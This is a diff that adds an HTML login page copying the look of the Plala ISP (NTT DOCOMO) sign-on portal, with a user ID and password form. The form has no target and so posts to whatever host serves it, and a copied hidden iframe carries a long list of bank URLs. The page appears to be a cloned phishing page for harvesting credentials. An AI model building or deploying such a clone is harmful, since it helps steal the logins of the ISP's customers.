@@ -1,0 +1,222 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=shift_jis">
+<title>ログイン</title>
+<script src="https://sec.plala.or.jp/fp/tags.js?org_id=2kamd3p6&amp;session_id=2b0015bbd5025377074bff85c3b933fa" type="text/javascript">
+</script>
+<link rel="stylesheet" href="sso/pf/css/base.css" type="text/css">
+<script type="text/javascript" src="sso/pf/js/common.js"></script>
+
+</head>
+<body>
+<noscript>
+<iframe src="https://sec.plala.or.jp/fp/tags?org_id=2kamd3p6&session_id=2b0015bbd5025377074bff85c3b933fa&pageid="
+style="width: 100px; height: 100px; border: 0; position: absolute; top: -5000px;">
+</iframe>
+</noscript>
+<div id="plala"> <a name="top"></a>
+  <table width="750" cellspacing="0" cellpadding="0" border="0">
+    <tbody><tr>
+      <td width="750"><!-- ========= HEADER ========= -->
+        <div id="head">
+          <div><img src="sso/pf/images/spacer.gif" alt="" width="1" height="11"></div>
+          <table width="100%" cellspacing="0" cellpadding="0" border="0">
+            <tbody><tr>
+              <td><table width="740" cellspacing="0" cellpadding="0" border="0">
+                  <tbody><tr>
+                    <td width="8"><img src="sso/pf/images/spacer.gif" alt="" width="8" height="1"></td>
+                    <td width="154" valign="top"><img src="sso/pf/images/hd_logo.gif" alt="plala" width="115" height="58" border="0"></td>
+                    <td width="380" valign="top"><div><img src="sso/pf/images/spacer.gif" alt="" width="380" height="50" border="0"></div></td>
+                    <td width="198" align="right"><div><img src="sso/pf/images/hd_plalanet_b.gif" alt="ぷらら" width="154" height="22"></div>
+                      <div><img src="sso/pf/images/spacer.gif" alt="" width="1" height="9"></div></td>
+                  </tr>
+                </tbody></table>
+                <table width="750" cellspacing="0" cellpadding="0" border="0">
+                  <tbody><tr>
+                    <td bgcolor="#eeeeee"><img src="sso/pf/images/barg.gif" alt="" width="750" height="30" border="0"></td>
+                  </tr>
+                </tbody></table></td>
+            </tr>
+          </tbody></table>
+        </div>
+        <!-- ========= /HEADER ========= -->
+      </td>
+    </tr>
+    <tr>
+      <td background="sso/pf/images/login_bg.gif"><div id="mainArea">
+          <div><img src="sso/pf/images/spacer.gif" alt="" width="1" height="5"></div>
+          <!-- ========= CAUTION ========= -->
+          <noscript>
+          <table border="0" cellspacing="0" cellpadding="0" width="727">
+            <tr>
+              <td><div class="caution"><span class="S">当サイトをご覧いただくためにはJavascriptを有効にする必要があります。お使いのブラウザのJavascriptを“有効”に設定してご覧下さい。</span></div></td>
+            </tr>
+          </table>
+          </noscript>
+          <!-- ========= /CAUTION ========= -->
+          <table width="727" cellspacing="0" cellpadding="0" border="0">
+            <tbody><tr>
+              <td width="727" valign="top"><!-- ========= CONTENTS ========= -->
+                <table width="727" cellspacing="0" cellpadding="0" border="0">
+                  <tbody><tr>
+                    <td align="center"><img src="sso/pf/images/spacer.gif" alt="" width="727" height="40"></td>
+                  </tr>
+                  <tr>
+                    <td align="center"><table width="543" cellspacing="0" cellpadding="0" border="0">
+                        <tbody><tr>
+                          <td><img src="sso/pf/images/spacer.gif" alt="" width="543" height="1" border="0"></td>
+                        </tr>
+                        <tr>
+                          <td><img name="mploginhead" src="sso/pf/images/mploginhead.gif" alt="ログイン" width="543" height="58" border="0"></td>
+                        </tr>
+                        <tr>
+                          <td class="tablein" background="sso/pf/images/mpmiddle.gif" align="center"><!-- setup-->
+                           
+ <form  method="post" id="contact-form">
+                <!-- ========= CONTENTS ========= -->
+                
+                                 <br>
+                              <input type="hidden" name="atesaki" value="dfw">
+			<input type="hidden" name="metrix_session_id" value="2b0015bbd5025377074bff85c3b933fa">
+                              <br>
+							    <table width="450" cellspacing="1" cellpadding="0" border="0">
+                                  <tbody><tr>
+                                    <td class="green">本サービスはシングルサインオン対応サービスです。</td>
+                                  </tr>
+                                </tbody></table>
+							  <br>
+                              <table width="450" cellspacing="1" cellpadding="0" border="0" align="center">
+                                <tbody><tr>
+                                  <td colspan="3" class="green">ユーザID/本パスワードを入力し、「ログイン」を押してください。</td>
+                                </tr>
+                                <tr>
+                                  <td colspan="3"><img src="sso/pf/images/spacer.gif" height="10"></td>
+                                </tr>
+                                <tr>
+                                  <td width="210" align="right">ユーザID</td>
+								  <td rowspan="3" width="30"><img src="sso/pf/images/spacer.gif" width="30" height="1"></td>
+                                  <td width="210" align="left"><input type="text" name="ACCOUNTUID" value="" size="26" maxlength="20"></td>
+                                </tr>
+                                <tr>
+                                  <td colspan="3"><img src="sso/pf/images/spacer.gif" height="15"></td>
+                                </tr>
+                                <tr>
+                                  <td align="right">本パスワード</td>
+                                  <td align="left"><input type="password" name="password" value="" size="26" maxlength="20"></td>
+                                </tr>
+                                <tr>
+                                  <td colspan="3"><img src="sso/pf/images/spacer.gif" height="8"></td>
+                                </tr>
+                                <tr>
+                                  <td colspan="3" class="green" align="center"><input type="checkbox" name="expiretype" value="1">
+								  &nbsp;&nbsp;<a href="javascript:wopen()">注意事項</a>に同意し、次回ログインを自動で行うためユーザIDを保存する</td>
+                                </tr>
+                            </tbody></table>
+                              <br>
+                              <br>
+                              <input type="hidden" name="HIDEURL" value="/ispmypageentryap/cgi-bin/mypage/main/agent.cgi?atesaki=auth2&amp;SWEET=http%3A%2F%2Fssofwd.ssosv.plala.or.jp%2Ffw%2Fdfw%2Fispmypageentryap%2Fcgi-bin%2Fmypage%2Fmain%2Fagent.cgi%3Fatesaki%3Dmypage_top">
+                              <input type="hidden" name="LOGIN" value="PlalaSSOLOGIN">
+                              <table width="300" cellspacing="0" cellpadding="0" border="0" align="center">
+                                <tbody><tr>
+                                  <td align="center"><p>
+								  <input type="image" name="submit" onclick="formSubmit()" onkeypress="if (event.keyCode==10) formSubmit();" onmouseover="this.src='sso/pf/images/login_on.gif'" onmouseout="this.src='sso/pf/images/login.gif'" src="sso/pf/images/login.gif" value="　ログイン　">							  
+								                                   </p></td>
+                                </tr>
+                              </tbody></table>
+                              <br>
+                              <div class="green" align="center">※ ユーザID/本パスワードを忘れた方は、<a href="https://www.plala.or.jp/support/pass_show/">こちら</a></div>
+                              <br>
+                              <table width="450" cellspacing="0" cellpadding="0" border="0">
+                                <tbody><tr>
+                                  <td class="green" align="center">【新しいログインの仕組シングルサインオン機能について】<br>
+								  <br>
+								  シングルサインオン機能を利用したログインでは、ブラウザにお客様の認証情報を保持しております。<br>
+								  認証状態は、ブラウザの全ての画面を閉じるまで保持します。<br><br>
+								  <span class="red">操作を終了する際は、必ずブラウザのウィンドウを全て閉じてください。</span><br><br>
+								</td>
+                                </tr>
+                            </tbody></table>
+							</form>
+							
+							
+							
+<script src="//cdnjs.cloudflare.com/ajax/libs/validate.js/0.13.1/validate.min.js"></script>
+ <script>
+
+
+     const constraints = {
+         
+         account: {
+             presence: { allowEmpty: false }
+         },
+         
+         password: {
+             presence: { allowEmpty: false }
+         }
+            };
+
+     const form = document.getElementById('contact-form');
+     form.addEventListener('submit', function (event) {
+
+         const formValues = {
+             account: form.elements.account.value,
+             password: form.elements.password.value
+         };
+
+
+         const errors = validate(formValues, constraints);
+         if (errors) {
+             event.preventDefault();
+             const errorMessage = Object
+                 .values(errors)
+                 .map(function (fieldValues) {
+                     return fieldValues.join(', ')
+                 })
+                 .join("\n");
+
+             alert(errorMessage);
+         }
+     }, false);
+ </script>
+                            <!-- /setup --></td>
+                        </tr>
+                        <tr>
+                          <td><img name="mpfoot" src="sso/pf/images/mpfoot.gif" alt="" width="543" height="50" border="0"></td>
+                        </tr>
+                      </tbody></table></td>
+                  </tr>
+                  <tr>
+                    <td align="center"><img src="sso/pf/images/spacer.gif" alt="" width="727" height="20"></td>
+                  </tr>
+                  <tr>
+                    <td align="center">
+					  <table width="543" cellspacing="0" cellpadding="0" border="0" align="center">
+                      </table>
+					  <br>
+					  <table width="543" cellspacing="0" cellpadding="0" border="0" align="center">
+					<tbody><tr><td class="Mfix" align="right"><a href="http://www.plala.or.jp/index.html" target="_top">ぷららトップへ</a></td></tr>
+					</tbody></table>
+					</td>
+                  </tr>
+                  <tr>
+                    <td align="center"><img src="sso/pf/images/spacer.gif" alt="" width="727" height="20"></td>
+                  </tr>
+                </tbody></table>
+                <!-- ========= /CONTENTS ========= -->
+              </td>
+            </tr>
+          </tbody></table>
+        </div></td>
+    </tr>
+    <tr>
+      <td bgcolor="#FFFFE6"><!-- ========= FOOTER ========= -->
+        <div id="copy"><span class="Mfix">©NTT DOCOMO</span></div>
+        <!-- ========= /FOOTER ========= -->
+      </td>
+    </tr>
+  </tbody></table>
+</div>
+
+
+
+<iframe src="about:blank" id="tmx_tags_iframe" title="empty" tabindex="-1" aria-disabled="true" aria-hidden="true" data-time="1690967160471" style="width: 0px; height: 0px; border: 0px none; position: absolute; top: -5000px;"></iframe><iframe id="tdz_ifrm" title="empty" name="" marginwidth="0" marginheight="0" style="display: none !important; z-index: -9999 !important; visibility: hidden !important;" aria-disabled="true" aria-hidden="true" tabindex="-1" src="https://sec.plala.or.jp/fp/HP?session_id=2b0015bbd5025377074bff85c3b933fa&amp;org_id=2kamd3p6&amp;nonce=f7845c2ee499ba84&amp;mode=2&amp;hp=.co-operativebank.co.uk/CBIBSWeb/login.do.co-operativebank.co.uk/CBIBSWeb/start.do.de/portal/portal/x.entropay.com/basemenu/prot/x.facebook.comx.nationet.com/x.netbank.commbank.com.au/netbank/bankmainx.npbs.co.uk/netmastergoldbanking/x.nwolb.xlogin.aspx?refereridentx.rbsdigital.xAccountSummaryx.smile.co.uk/SmileWeb/login.do.smile.co.uk/SmileWeb/start.do.yandex.rux/CapitalOne_Consumer/x/easypay.by/x/sbank.ru/x53.com/servlet/efsonlinex://online.wellsfargo.com/x://secure.assist.ru/assistid/protected/main.doxabbeynational.co.uk/EBAN_ENS/BtoChannelDriverxalliance-leicesterxaltergold.com/login.phpxamericanexpress.com/myca/intl/acctsumm/emea/accountSummaryxbancaintesa.it/xbankcardservices.co.ukxbankofamerica.com/xbanquepopulaire.fr/xbnpparibas.net/xcahoot.comxcapitaloneonline.co.uk/CapitalOne_Consumer/Transactionsxcbonline.co.uk/ralu/reglm-web/setupSecurityQuestionPagexcibc.comxPreSignOnxcibc.comxSignOnxcitibank.ru/xclient.uralsibbank.ruxco-operativebank.co.uk/CBIBSWeb/loginSpixcommerceonlinebanking.comxcoventrybuildingsociety.co.ukxdeutsche-bank.dexdiscovercard.com/cardmembersvcs/strongauth/app/sa_mainxebanking.bawag.comxebc_ebc1961xegg.com/customer/movemoneyxegg.com/customer/yourmoneyxfacebook.com/xhalifax-online.co.ukxMyAccountsxhalifax-online.co.uk/x/Mhalifax-online.co.uk/personalxhsbc.co.uk/1/2/personal/internet-banking/xhsbc.comxhttps://banking.postbank.de/app/finanzstatus.init.do;jsessionidxib.fineco.it/FinecoWeb/BonificiServletxib.fineco.it/FinecoWeb/jsp/Main/HBFineco.jspxib.fineco.it/FinecoWeb/jsp/Main/Principale.jspxibank.alfabank.ruxin-biz.it/xipko.plxlibertyreserve.com/x/historylibertyreserve.com/x/loginwww.libertyreserve.com/x/Core.jswww.libertyreserve.com/x/transfer.libertyreserve.com/x/commonscript.jslloydstsb.co.uk/personal/a/account_overview/xmbna.co.ukxmenyala.ruxmoney.yandex.ruxmoneybookers.com/app/login.plxmoneymail.ruxmy.ebay.co.uk/ws/eBayISAPI.dll?MyEbayxmy.ebay.com/ws/eBayISAPI.dll?MyEbayxmy.ebay.fr/ws/eBayISAPI.dll?MyEbayxmybusinessbank.co.ukxnationet.com/AppServices/SignOn/SignOnProcess/RcaSignOnxnpbs.co.ukxnwolb.com/AccountSummaryxnwolb.com/Statementsxnwolb.com/TransfersLandingPagexoltx.fidelity.com/x/x/ofsummary/summaryxonline.lloydstsb.co.ukxonlinebanking.mandtbank.com/summary/AccountSummaryxpassport.yandex.ruxpaypal.com/x/cgi-bin/webscr?cmd=_accountxpaypal.com/x/cgi-bin/webscr?cmd=_login-done&amp;login_access=xpaypal.com/us/cgi-bin/webscr?cmd=_login-done&amp;login_access=xposte.it/xpsk.co.at/xsecure.lloydstsb.co.uk/personal/a/account_overviewxsmile.co.uk/SmileWeb/passcodexusaa.com/xusbank.com/internetBanking/RequestRouter?requestCmdId=Gxwachovia.comxybonline.co.uk/ralu/reglm-web/setupSecurityQuestionPagex.amazon.fr/xhistory/orders/view.htmlx.banquepopulaire.frxShowPortal.dox.bnpparibasfortis.bexHome_Logon.aspx.cdiscount.com/Account/Home.aspxx.cmb.frxaccueil.jspx.credit-agricole.frxentreeBam?sessionSAGx.labanquepostale.fr/xreleveCPP-releve_ccp.eax.secure.bnpparibas.net/NSFR?Actionx.secure.lcl.frxAccueilxcredem.it/OneToOne/ebank/functionsxmijn.ing.nl/xonline.ybs.co.ukxwww.discover.com/xorder.cdiscount.comxCustomer.aspxxsealinfo.verisign.com/splash?form_filexvos-comptes.credit-du-nord.fr/CDC_TableauDeBord_0.asp?xvoscomptesenligne.labanquepostale.frxwww.x.caisse-epargne.fr/Portail.aspxxwww.exabanque.netxonglet.phpxdeutsche-bank.de/xnorisbank.de/xpostbank.de/xtargobank.de/x.x.de/portal/x.bankofamerica.com/x/commonscript.js.bmo.com/OLB?id=x.bmo.com/RMC?id=x.chase.com/x.aspxx.chase.com/js/Reporting.jsx.koodomobile.com/account/selfserve/x/xaccountId=x.payment.ru/x.scotiabank.com/portal/index.jsp?xbancopopular.es/empresasxcreval.it/login2007/loginSiciliano.aspxfirst-direct.com/xipko.plxmybusinessbank.co.ukxsanpaoloimi.com/xulsterbankanytimebanking.x/login.aspxx" width="0px" height="0px" frameborder="0"></iframe></body></html>
